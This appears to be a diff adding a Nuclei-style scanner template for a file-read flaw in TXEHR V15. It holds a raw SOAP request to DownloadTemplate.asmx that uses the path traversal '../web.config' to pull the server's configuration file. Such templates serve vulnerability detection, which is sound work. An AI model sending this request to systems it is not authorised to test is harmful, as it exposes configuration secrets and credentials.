@@ -1,0 +1,35 @@
+id: poc-yaml-tosharesoft-txehr-v15-downloadtemplate-upload
+info:
+  name: TXEHR V15 DownloadTemplate File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        POST /Service/DownloadTemplate.asmx HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: "http://tempuri.org/DownloadFile"
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <DownloadFile xmlns="http://tempuri.org/">
+              <path>../web.config</path>
+            </DownloadFile>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<soap:Body>"
+          - "<DownloadFileResult>"
+          - "<?xml version"
